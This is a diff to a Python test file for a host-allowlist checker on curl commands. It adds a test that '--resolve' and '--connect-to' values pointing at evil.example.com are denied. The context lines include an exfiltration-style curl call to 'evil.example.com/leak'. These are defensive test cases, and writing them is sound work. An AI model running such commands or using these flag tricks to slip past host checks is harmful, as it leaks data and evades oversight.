@@ -58,3 +58,13 @@ def test_curl_flag_value_does_not_mask_a_real_bad_host():
     the bare host after the consumed value is still checked."""
     assert _decide("curl -o out.csv evil.example.com") == "deny"
     assert _decide("curl --output x.csv https://evil.example.com/leak") == "deny"
+
+
+def test_resolve_and_connect_to_values_still_host_checked():
+    """--resolve / --connect-to carry meaningful hostnames in their values and
+    must NOT be skipped (unlike output/data flags): the value's host is still
+    checked. (Devin review on #847.)"""
+    assert _decide("curl --resolve evil.example.com:443:1.2.3.4 https://api.github.com/x") == "deny"
+    assert _decide("curl --connect-to evil.example.com:443:1.2.3.4:443 https://api.github.com/x") == "deny"
+    # sanity: a --resolve pinning an allowlisted host is still allowed
+    assert _decide("curl --resolve api.github.com:443:1.2.3.4 https://api.github.com/x") == "allow"
